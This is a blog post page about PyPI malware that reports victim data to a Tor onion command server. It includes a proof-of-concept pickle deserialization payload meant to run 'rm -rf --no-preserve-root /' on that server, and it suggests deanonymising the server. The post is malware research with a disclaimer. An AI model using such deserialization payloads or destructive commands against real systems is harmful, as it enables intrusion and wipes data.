<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<link rel="icon" href="../favicon.png" />
		<meta name="viewport" content="width=device-width" />
		
		<meta name="description" content="This website has no purpose other than a dumping ground for random blog posts.">
		<meta property="og:image" content="/profile.webp">
		
		<title>lockness-Ko</title>
		
		<meta http-equiv="content-security-policy" content="">
		<link href="../_app/immutable/assets/_layout-6a01c3f4.css" rel="stylesheet">
		<link href="../_app/immutable/assets/_page-cc4ed907.css" rel="stylesheet">
		<link rel="modulepreload" href="../_app/immutable/start-1be66807.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/index-4269754f.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/singletons-bd2b86b0.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/preload-helper-9b728935.js">
		<link rel="modulepreload" href="../_app/immutable/components/pages/_layout.svelte-045aa110.js">
		<link rel="modulepreload" href="../_app/immutable/modules/pages/_layout.ts-b8ee4d7c.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/_layout-1daba58d.js">
		<link rel="modulepreload" href="../_app/immutable/components/pages/blog/_id_/_page.svelte-a5a20c95.js">
		<link rel="modulepreload" href="../_app/immutable/modules/pages/blog/_id_/_page.ts-0e951d9a.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/_page-37c3de76.js">
	</head>
	<body>
		<div style="display: contents">


<header class="svelte-kqeq6i"><a href="/" class="svelte-kqeq6i">Home</a>

  <nav><ul class="svelte-kqeq6i"><li><a href="/blog" class="svelte-kqeq6i">Blog</a></li>
      <li><a href="/about" class="svelte-kqeq6i">About</a></li>
      <li><a href="/contact" class="svelte-kqeq6i">Contact</a></li></ul></nav>
</header>

<main><article><h1 class="svelte-7aimqn">Malware madness</h1>
  <p>Published: 2023-4-24</p>
  <hr>
  <div class="main-post"><p>I’ve recently been helping track threat actors that upload malware
to the PYPI package index (stuff that you can pip install).</p>
<p>Here’s a collection of madness</p>
<hr>
<h2>Tor Shenanigans</h2>
<p>People think that when you put something behind tor it’s really secure, super
hidden and impossible to find. This sample, however, proves the opposite.</p>
<p><img src="/i/more_malware_tor.png" alt="tor shenanigans"></p>
<p>I’ve deleted most of the boilerplate but in essence all it does is make a
socket connection to the onion service by setting it as a socks proxy.</p>
<p>It then sends your ip address (‘grabbed’ from httpbin[.]com), username, etc
with the <code>send_data function</code>. Some people will see the glaring issue right
away but for those who haven’t used python extensively, the <code>pickle.loads</code>
function is vulnerable arbitrary python code execution. Here is a really
simple PoC to pwn the c2 server:</p>
<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># please don't actually run this :(</span>
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">RCE</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'rm -rf --no-preserve-root /'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">send_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    data_len_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_len_str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data_len_str

    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

c2_link <span class="token operator">=</span> <span class="token string">'zuela32n363gucsyr5z4w635pmthnq4lsxod43r3yapu4vddn5qwcpad[.]onion'</span> <span class="token comment"># i've defanged this</span>
c2_port <span class="token operator">=</span> <span class="token number">1337</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RCE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>c2_link<span class="token punctuation">,</span> c2_port<span class="token punctuation">)</span> <span class="token comment"># yes, I know this doesn't work it's just pseudocode</span>
    send_data<span class="token punctuation">(</span>s<span class="token punctuation">,</span> pickled<span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
<p>Running this code sample would execute the <code>rm -rf --no-preserve-root /</code> command
on the remote server, wiping all files and folders from the system. We could also
deanonymise the server by having it call back to us. However, I’ll leave that as
as exercise for the reader. </p>
<p><strong>SERIOUS DISCLAMER: fr doe don’t actually do bad things with this, no matter
who it is</strong></p></div>
</article>

  <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="[object Object]"></script>
</main>


		<script type="module" data-sveltekit-hydrate="168t95s">
			import { start } from "../_app/immutable/start-1be66807.js";

			start({
				env: {},
				hydrate: {
					status: 200,
					error: null,
					node_ids: [0, 5],
					params: {id:"more_malware"},
					route: {"id":"/blog/[id]"},
					data: [null,null],
					form: null
				},
				paths: {"base":"","assets":""},
				target: document.querySelector('[data-sveltekit-hydrate="168t95s"]').parentNode,
				version: "1730601138582"
			});
		</script>
	</div>
	</body>
</html>
